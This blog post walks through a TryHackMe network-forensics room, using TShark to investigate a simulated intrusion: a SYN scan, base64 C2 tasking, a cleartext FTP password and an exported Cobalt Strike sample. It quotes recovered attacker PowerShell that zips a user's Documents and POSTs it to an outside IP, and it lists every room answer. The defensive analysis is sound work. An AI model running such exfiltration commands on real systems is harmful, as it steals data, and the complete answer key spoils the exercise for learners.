---
title: "TryHackMe Advanced Packet Analysis: What the Logs Could Not Tell You"
date: 2026-08-22T12:44:00+05:30
lastmod: 2026-08-22T12:44:00+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://anir0y.in
featureimage: img/thm-apa/00-thumbnail.png

categories:
  - TryHackMe
tags:
  - tryhackme
  - thm
  - rooms
  - SOC Level 2
  - Wireshark
  - TShark
  - Network Forensics
  - Blue Team

draft: false
description: "Walkthrough of TryHackMe Advanced Packet Analysis: triaging a SYN scan with TShark, decoding base64 C2 tasking, pulling cleartext FTP credentials, exporting and hashing malware from a PCAP, and reading JA4 fingerprints."
---

## Advanced Packet Analysis

Room 5 of 6 in the **Advanced Traffic Analysis** module on SOC Level 2, and the payoff for everything before it. [Network Monitoring with Zeek](/post/thm-room-networkmonitoringwithzeek/) reduced this same Nexus Financial intrusion to structured logs that told us *what connections existed and how much data moved*. This room opens the actual capture and answers the question logs cannot: **what was inside**.

One PCAP at `/home/ubuntu/captures/investigation.pcap` covers 02:30 to 04:00 UTC on the Finance subnet. Wireshark is on the desktop; I worked almost entirely in TShark, since every question here reduces to a display filter plus a field extraction. Same cast as before: `10.14.22.88` (WKST-FINANCE-04), C2 at `194.165.16.56`, exfil drop at `185.213.154.201`.

![The Advanced Packet Analysis room on TryHackMe with all eight tasks green and Room completed 100 percent](/img/thm-apa/06-room-complete.png)

## Task 2: is the scan alert real?

Two NIDS alerts fired at 03:14:27 — an internal SYN scan and an outbound connection to a known-bad indicator. Both need triage before escalation.

```bash
cd ~/captures
tshark -r investigation.pcap \
  -Y "ip.src == 10.14.22.88 and tcp.flags.syn == 1 and tcp.flags.ack == 0 and tcp.dstport == 445" \
  -T fields -e ip.dst | sort -u | wc -l
# 87

tshark -r investigation.pcap \
  -Y "http.request and ip.src==10.14.22.88 and ip.dst==194.165.16.56" \
  -T fields -e http.request.uri | wc -l
# 23
```

![TShark output showing 87 unique SMB scan destinations and 23 HTTP beacon requests](/img/thm-apa/01-scan-triage.png)

**87** unique destinations on TCP/445, one SYN each with no completed handshake — a textbook SYN (stealth) scan, T1046 Network Service Discovery. And **23** plain HTTP beacon requests to the flagged IP. Both alerts are true positives.

A note on that first number, because it is the room's one real trap. My first attempt dropped the `tcp.dstport == 445` clause, reasoning that "unique destination IPs the host scans" should mean all of them. That returns **95** — the extra eight are the C2, the exfil drop, DNS servers and other legitimate destinations that also happen to receive a SYN. The scan is specifically the SMB sweep, and the room's taught filter includes the port. Read the filter the task builds before generalising it.

## Task 3: proving it is C2, not a software updater

Regularity is suggestive; content is proof.

```bash
tshark -r investigation.pcap -Y "http.request and ip.dst==194.165.16.56" \
  -T fields -e http.request.full_uri | head -2
# http://update.softpatch-cdn.com/api/v2/check
# http://update.softpatch-cdn.com/api/v2/check
```

Every one of the 23 requests hits **/api/v2/check** on a host named to look like a CDN. The requests carry a static cookie, `session=eyJpbXBsYW50X2lkIjoiRk5DLTA0In0=`, which decodes to `{"implant_id":"FNC-04"}` — an implant ID, not a session token, and identical across every beacon.

The tasking is in the *response*, not the request:

```bash
strings investigation.pcap | grep -B2 'cmd"'
# Content-Type: application/json
# Content-Length: 38
# {"status":"ok","cmd":"d2hvYW1p"}

echo d2hvYW1p | base64 -d
# whoami
```

The base64 `cmd` value decodes to **whoami**. That is a live operator issuing a command, and it settles the question a beacon-timing histogram never could.

Worth recording: `tshark -Y "http.response" -T fields -e http.file_data` came back **empty** for these responses, which briefly looked like the bodies were not captured. They were — the dissector just did not populate `http.file_data` here, and plain `strings` found them immediately. When a field extraction returns nothing on data you can see in the stream, check the raw bytes before concluding the evidence is missing.

{{< ad >}}

## Task 4: reading sessions instead of packets

Three different protocols, three different kinds of evidence.

```bash
tshark -r investigation.pcap -Y "ftp.request.command==USER or ftp.request.command==PASS" \
  -T fields -e ip.src -e ftp.request.command -e ftp.request.arg
# 10.14.22.88  USER  administrator
# 10.14.22.88  PASS  S3cur3P@ssw0rd!

tshark -r investigation.pcap -Y "http.response.code==302" \
  -T fields -e http.location
# https://files.cdn-delivery.net/winservice-patch-4891.pdf
```

![TShark output showing the FTP administrator credential in cleartext and the 302 redirect location](/img/thm-apa/02-ftp-redirect.png)

FTP transmits credentials in cleartext, so the password **S3cur3P@ssw0rd!** for the `administrator` account is simply sitting in the capture. The 302 chain starts at `intranet.nfg.local/index.php` and lands on **winservice-patch-4891.pdf** — the redirect is what makes a compromised internal page look like a legitimate patch download.

The reverse-shell session carries the staging command:

```bash
strings investigation.pcap | grep -i "compress-archive"
# C:\Users\jsmith\Desktop>powershell -Command "Compress-Archive -Path C:\Users\jsmith\Documents\*
#   -DestinationPath C:\Temp\docs.zip"
# C:\Users\jsmith\Desktop>powershell -Command "Invoke-WebRequest -Uri 'http://185.213.154.201/upload'
#   -Method POST -InFile C:\Temp\docs.zip"
```

The accepted answer is the inner command only — **`Compress-Archive -Path C:\Users\jsmith\Documents\* -DestinationPath C:\Temp\docs.zip`** — without the `powershell -Command "` wrapper. The underscore mask settles this for free: it reads `________________ _____ _:\_____\______\_________\_ ________________ _:\____\____.___`, which is 16 characters, then 5, then a path — `Compress-Archive` and `-Path`, with no room for a wrapper.

## Task 5: extracting the files and hashing them

```bash
mkdir -p /home/ubuntu/exp
tshark -r investigation.pcap --export-objects http,/home/ubuntu/exp -q
sha256sum /home/ubuntu/exp/*
file /home/ubuntu/exp/winservice-patch-4891.pdf /home/ubuntu/exp/upload
```

![TShark export showing SHA256 hashes, matching threat feed lines for Cobalt Strike and Staging Archive, and file confirming the PDF is really an MS-DOS executable](/img/thm-apa/03-hashes-feed.png)

Four objects come out, two of them interesting:

```
4ec66c72e7d80620891118cb32206771ac37a227b6e77a2549b046748d8c234b  winservice-patch-4891.pdf
d17a83cf82a3cf4e5b3891e8b0923d00b22181e3079624cec60ca105c0eaf369  upload

winservice-patch-4891.pdf: MS-DOS executable, MZ for MS-DOS
upload:                    Zip archive data, at least v2.0 to extract
```

The "PDF" is a **PE executable** — the extension is decoration and `file` calls it in one line. Cross-referencing both hashes against the local feed assigns the family:

```
4ec66c72...d8c234b  Cobalt Strike     2025-11-10  high
d17a83cf...0eaf369  Staging Archive   2025-11-10  high
```

The malware family is **Cobalt Strike**, dated four days before the capture.

One shell detail cost a cycle here: `--export-objects http,~/exp` silently wrote nothing. Tilde expansion does not happen after a comma inside an argument, so TShark created a literal directory named `~` in the working directory and dropped the objects there. Use an absolute path with `--export-objects`.

## Task 6: what a TLS handshake gives up

The C2 also runs encrypted sessions. Without decryption you still get the certificate and a client fingerprint.

```bash
tshark -r investigation.pcap -Y "tls.handshake.type==11" \
  -T fields -e x509sat.printableString | sort -u
# Microsoft,update.softpatch-cdn.com,Microsoft,update.softpatch-cdn.com

tshark -r investigation.pcap -Y "tls.handshake.type==1" \
  -T fields -e ip.dst -e tls.handshake.ja4 | sort | uniq -c
#   6 194.165.16.56  t13d040400_98dd3bb0ed34_34f36fd09b12
```

![TShark output showing the certificate subject CN update.softpatch-cdn.com issued by Microsoft, and six Client Hellos all producing the same JA4 fingerprint](/img/thm-apa/04-tls-ja4.png)

The subject CN is **update.softpatch-cdn.com**, issued by an organisation calling itself "Microsoft" — a self-signed certificate impersonating a vendor, which no real CA would have signed. Every Client Hello to that host produces the identical JA4 fingerprint **t13d040400_98dd3bb0ed34_34f36fd09b12**. JA4 hashes the client's TLS negotiation preferences, so it identifies the *implant*, not the destination: the same fingerprint will match this malware family on a different IP, a different port and a different domain. That is the pivot that survives infrastructure rotation.

## Task 7: protocol abuse and the IOC package

```bash
tshark -r investigation.pcap -Y 'dns.qry.name matches "^[a-zA-Z0-9]{25,}\."' \
  -T fields -e dns.qry.name | head -1
# ycepusut4rqdphazioh4llcpktgmajo33byurpbs.exfil.fastsync-cdn.net
```

Long high-entropy labels all hanging off **exfil.fastsync-cdn.net** — a second exfiltration channel running over DNS, separate from the HTTP upload. Note the parent domain is the full `exfil.fastsync-cdn.net`, not the registrable `fastsync-cdn.net`; my first `awk -F.` grab of the last two labels gave the shorter form, and the answer mask (`_____.____________.___`) shows three labels.

Finally the room's own pipeline turns all of this into a handoff package:

```bash
bash /home/ubuntu/scripts/extract_iocs.sh
wc -l < /home/ubuntu/evidence/iocs/external_ips.txt
# 8
```

![Output of extract_iocs.sh listing eight external IPs and a sample DNS tunnel query under exfil.fastsync-cdn.net](/img/thm-apa/05-ioc-package.png)

**8** external IPs, written alongside HTTP hosts, TLS SNI values, DNS queries, JA4 fingerprints and exported file hashes. The script is just TShark field extractions with RFC1918 filtered out by `grep -v`, which is the point — it is reusable against any future capture without re-deriving the investigation.

## Every answer

| Task | Question | Answer |
|---|---|---|
| 2 | Unique destination IPs scanned | `87` |
| 2 | Plain HTTP beacon requests to the C2 | `23` |
| 3 | Request URI every beacon targets | `/api/v2/check` |
| 3 | Decoded base64 `cmd` value | `whoami` |
| 4 | Cleartext FTP password | `S3cur3P@ssw0rd!` |
| 4 | PowerShell command packaging Documents | `Compress-Archive -Path C:\Users\jsmith\Documents\* -DestinationPath C:\Temp\docs.zip` |
| 4 | Malicious file at the end of the 302 chain | `winservice-patch-4891.pdf` |
| 5 | SHA256 of the extracted executable | `4ec66c72e7d80620891118cb32206771ac37a227b6e77a2549b046748d8c234b` |
| 5 | SHA256 of the 5.3 MB POSTed archive | `d17a83cf82a3cf4e5b3891e8b0923d00b22181e3079624cec60ca105c0eaf369` |
| 5 | Threat-feed malware family | `Cobalt Strike` |
| 6 | Subject CN on the C2 certificate | `update.softpatch-cdn.com` |
| 6 | JA4 fingerprint of every Client Hello | `t13d040400_98dd3bb0ed34_34f36fd09b12` |
| 7 | Parent domain of the long-subdomain queries | `exfil.fastsync-cdn.net` |
| 7 | Unique external IPs from extract_iocs.sh | `8` |

## Wrap-up

Two things worth keeping.

**A field extraction returning nothing is not proof the data is absent.** `http.file_data` came back empty for the C2 responses that plainly contained the tasking, and `--export-objects http,~/exp` wrote four files into a directory literally named `~`. Neither failed loudly — both produced empty output and a zero exit code. In packet work the cheap cross-check is always the raw bytes: `strings`, or Follow Stream, before deciding the evidence is not there.

**Fingerprint the client, not the infrastructure.** Every IP, domain and certificate in this capture is disposable — the operator can rotate all of them tonight. The JA4 value `t13d040400_98dd3bb0ed34_34f36fd09b12` describes how *the implant* negotiates TLS, and the `implant_id` cookie is constant across all 23 beacons regardless of where they point. Those are the indicators worth hunting retroactively across the estate, because they survive the infrastructure change that makes every IP-based IOC stale within a week.

Room solved 100% — 8 tasks, 16 answers, 120 points.
